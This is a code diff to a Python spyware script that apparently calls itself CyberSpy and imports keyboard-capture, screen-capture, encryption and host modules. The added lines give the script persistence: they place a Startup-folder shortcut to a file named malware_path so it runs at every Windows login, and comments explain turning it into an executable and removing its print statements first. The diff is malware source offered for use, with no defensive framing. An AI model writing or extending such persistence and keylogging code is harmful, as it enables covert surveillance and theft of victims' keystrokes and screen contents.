@@ -6,12 +6,38 @@ import re
 import keyboard
 import encryptor
 import host
+import os
+import winshell
 
 flag = False
 keys = []
 
 # Configure Tesseract executable path
 pytesseract.pytesseract.tesseract_cmd = r"C:\path\to\tesseract.exe"
+
+malware_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'CyberSpy.py') # change the extension to CyberSpy.exe before converting it into executable.
+
+# Destination folder for the Startup folder
+startup_folder = winshell.startup()
+
+shortcut_path = os.path.join(startup_folder, 'shortcut.lnk')
+
+# remove print statements before converting into executable.
+if os.path.exists(malware_path):
+    if not os.path.exists(shortcut_path):
+        try:
+            winshell.CreateShortcut(
+                Path=shortcut_path,
+                Target=malware_path,
+                Description="Shortcut to My Executable"
+            )
+            print(f'Shortcut created in the Startup folder: {shortcut_path}')
+        except PermissionError:
+            print('Permission denied. Run the script with administrator privileges.')
+        except Exception as e:
+            print(f'An error occurred: {str(e)}')
+else:
+    print('doesnt exists')
 
 # all the print statements are for testing purposes
 def capture_screen():
